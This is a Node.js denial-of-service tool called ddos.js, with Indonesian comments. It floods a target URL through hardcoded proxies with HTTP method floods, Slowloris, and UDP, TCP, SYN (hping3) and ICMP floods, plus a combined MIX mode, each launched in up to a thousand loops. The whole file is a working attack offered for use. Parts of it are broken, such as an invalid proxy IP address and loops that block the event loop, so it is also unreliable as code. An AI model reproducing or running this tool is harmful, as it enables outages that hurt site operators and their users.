const axios = require('axios');
const request = require('request');
const dgram = require('dgram');
const net = require('net');
const { exec } = require('child_process');
const cloudscraper = require('cloudscraper');
const HttpsProxyAgent = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');

// Ambil URL dan metode dari argumen
const url = process.argv[2];
const methods = process.argv.slice(3, -1);
const numThreads = parseInt(process.argv[process.argv.length - 1], 10) || 1000;

// Proxy setup
const httpProxy = 'http://134.177.361:8080';  // Ganti port jika perlu
const socksProxy = 'socks5://134.177.361:1080';  // Ganti port jika perlu

const httpAgent = new HttpsProxyAgent(httpProxy);
const socksAgent = new SocksProxyAgent(socksProxy);

if (!url || methods.length === 0) {
  console.error('Usage: node ddos.js <url> <method1> <method2> ... <threads>');
  console.error('Methods: GET, POST, HEAD, PUT, DELETE, Slowloris, Cloudscraper, UDP, TCP, SYN, ICMP, MIX, STRESS');
  process.exit(1);
}

// Helper functions to start threads
function createThreads(method) {
  for (let i = 0; i < numThreads; i++) {
    method();
  }
}

// GET Flood
async function sendGetFlood() {
  console.log('Sending GET Flood...');
  while (true) {
    try {
      const response = await axios.get(url, { httpAgent, httpsAgent: httpAgent });
      console.log('GET Flood Status:', response.status);
    } catch (error) {
      console.error('GET Flood Error:', error.message);
      if (error.response && error.response.status === 503) {
        console.log('Website mungkin down.');
      }
    }
  }
}

// POST Flood
async function sendPostFlood() {
  console.log('Sending POST Flood...');
  while (true) {
    try {
      const response = await axios.post(url, { data: 'test' }, { httpAgent, httpsAgent: httpAgent });
      console.log('POST Flood Status:', response.status);
    } catch (error) {
      console.error('POST Flood Error:', error.message);
      if (error.response && error.response.status === 503) {
        console.log('Website mungkin down.');
      }
    }
  }
}

// HEAD Flood
async function sendHeadFlood() {
  console.log('Sending HEAD Flood...');
  while (true) {
    try {
      const response = await axios.head(url, { httpAgent, httpsAgent: httpAgent });
      console.log('HEAD Flood Status:', response.status);
    } catch (error) {
      console.error('HEAD Flood Error:', error.message);
      if (error.response && error.response.status === 503) {
        console.log('Website mungkin down.');
      }
    }
  }
}

// PUT Flood
async function sendPutFlood() {
  console.log('Sending PUT Flood...');
  while (true) {
    try {
      const response = await axios.put(url, { data: 'test' }, { httpAgent, httpsAgent: httpAgent });
      console.log('PUT Flood Status:', response.status);
    } catch (error) {
      console.error('PUT Flood Error:', error.message);
      if (error.response && error.response.status === 503) {
        console.log('Website mungkin down.');
      }
    }
  }
}

// DELETE Flood
async function sendDeleteFlood() {
  console.log('Sending DELETE Flood...');
  while (true) {
    try {
      const response = await axios.delete(url, { httpAgent, httpsAgent: httpAgent });
      console.log('DELETE Flood Status:', response.status);
    } catch (error) {
      console.error('DELETE Flood Error:', error.message);
      if (error.response && error.response.status === 503) {
        console.log('Website mungkin down.');
      }
    }
  }
}

// Slowloris
function sendSlowloris() {
  console.log('Sending Slowloris...');
  while (true) {
    try {
      request.get(url, { proxy: httpProxy, headers: { 'User-Agent': 'Slowloris' } }, (error, response) => {
        if (error) {
          console.error('Slowloris Error:', error.message);
        } else {
          console.log('Slowloris Status:', response.statusCode);
        }
      });
    } catch (error) {
      console.error('Slowloris Error:', error.message);
    }
  }
}

// Cloudscraper
function fetchWithCloudscraper() {
  console.log('Fetching content with Cloudscraper...');
  cloudscraper.get(url, { proxy: httpProxy })
    .then((html) => {
      console.log('HTML content:', html);
    })
    .catch((error) => {
      console.error('Error occurred with cloudscraper:', error);
    });
}

// UDP Flood
function sendUdpFlood() {
  console.log('Sending UDP Flood...');
  const client = dgram.createSocket('udp4');
  const target = new URL(url).hostname;
  const port = 80; // Default port, modify as needed
  const message = Buffer.from('A'.repeat(1024)); // Mengirimkan pesan dengan ukuran 1KB

  setInterval(() => {
    client.send(message, 0, message.length, port, target, (err) => {
      if (err) console.error('UDP Flood Error:', err);
    });
  }, 10);
}

// TCP Flood
function sendTcpFlood() {
  console.log('Sending TCP Flood...');
  const target = new URL(url).hostname;
  const port = 80; // Default port, modify as needed

  function createTcpConnection() {
    const socket = new net.Socket();
    socket.connect(port, target);
    socket.on('connect', () => {
      console.log('TCP Flood Connection Established');
    });
    socket.on('error', (err) => {
      console.error('TCP Flood Error:', err.message);
    });
    socket.on('close', () => {
      console.log('TCP Flood Connection Closed');
    });
  }

  setInterval(createTcpConnection, 10);
}

// SYN Flood
function sendSynFlood() {
  console.log('Sending SYN Flood...');
  const target = new URL(url).hostname;
  const port = 80; // Default port, modify as needed

  exec(`hping3 --flood -S -p ${port} ${target}`, (err, stdout, stderr) => {
    if (err) {
      console.error('SYN Flood Error:', err);
    }
    if (stderr) {
      console.error('SYN Flood Stderr:', stderr);
    }
    console.log('SYN Flood Output:', stdout);
  });
}

// ICMP Flood
function sendIcmpFlood() {
  console.log('Sending ICMP Flood...');
  const target = new URL(url).hostname;

  exec(`ping -f ${target}`, (err, stdout, stderr) => {
    if (err) {
      console.error('ICMP Flood Error:', err);
    }
    if (stderr) {
      console.error('ICMP Flood Stderr:', stderr);
    }
    console.log('ICMP Flood Output:', stdout);
  });
}

// MIX Flood
function sendMixFlood() {
  console.log('Sending MIX Flood...');
  const methods = [
    sendGetFlood,
    sendPostFlood,
    sendHeadFlood,
    sendPutFlood,
    sendDeleteFlood,
    sendSlowloris,
    sendUdpFlood,
    sendTcpFlood,
    sendSynFlood,
    sendIcmpFlood
  ];

  while (true) {
    const method = methods[Math.floor(Math.random() * methods.length)];
    method();
  }
}

// STRESS Test
function sendStressTest() {
  console.log('Starting STRESS Test...');
  exec(`artillery quick --count ${numThreads} -d 60 ${url}`, (err, stdout, stderr) => {
    if (err) {
      console.error('STRESS Test Error:', err);
    }
    if (stderr) {
      console.error('STRESS Test Stderr:', stderr);
    }
    console.log('STRESS Test Output:', stdout);
  });
}

// Check website status
async function checkWebsiteStatus() {
  try {
    const response = await axios.get(url, { httpAgent, httpsAgent: httpAgent });
    console.log('Website Status:', response.status);
  } catch (error) {
    console.error('Website mungkin down atau tidak dapat dijangkau:', error.message);
    process.exit(1);
  }
}

// Start methods based on arguments
async function startMethods() {
  await checkWebsiteStatus();

  console.log('Bot telah dikirim.');

  if (methods.includes('GET')) {
    console.log('Starting GET Flood...');
    createThreads(sendGetFlood);
  }

  if (methods.includes('POST')) {
    console.log('Starting POST Flood...');
    createThreads(sendPostFlood);
  }

  if (methods.includes('HEAD')) {
    console.log('Starting HEAD Flood...');
    createThreads(sendHeadFlood);
  }

  if (methods.includes('PUT')) {
    console.log('Starting PUT Flood...');
    createThreads(sendPutFlood);
  }

  if (methods.includes('DELETE')) {
    console.log('Starting DELETE Flood...');
    createThreads(sendDeleteFlood);
  }

  if (methods.includes('Slowloris')) {
    console.log('Starting Slowloris...');
    createThreads(sendSlowloris);
  }

  if (methods.includes('Cloudscraper')) {
    console.log('Fetching content with Cloudscraper...');
    fetchWithCloudscraper();
  }

  if (methods.includes('UDP')) {
    console.log('Starting UDP Flood...');
    createThreads(sendUdpFlood);
  }

  if (methods.includes('TCP')) {
    console.log('Starting TCP Flood...');
    createThreads(sendTcpFlood);
  }

  if (methods.includes('SYN')) {
    console.log('Starting SYN Flood...');
    createThreads(sendSynFlood);
  }

  if (methods.includes('ICMP')) {
    console.log('Starting ICMP Flood...');
    createThreads(sendIcmpFlood);
  }

  if (methods.includes('MIX')) {
    console.log('Starting MIX Flood...');
    createThreads(sendMixFlood);
  }

  if (methods.includes('STRESS')) {
    console.log('Starting STRESS Test...');
    sendStressTest();
  }
}

startMethods();
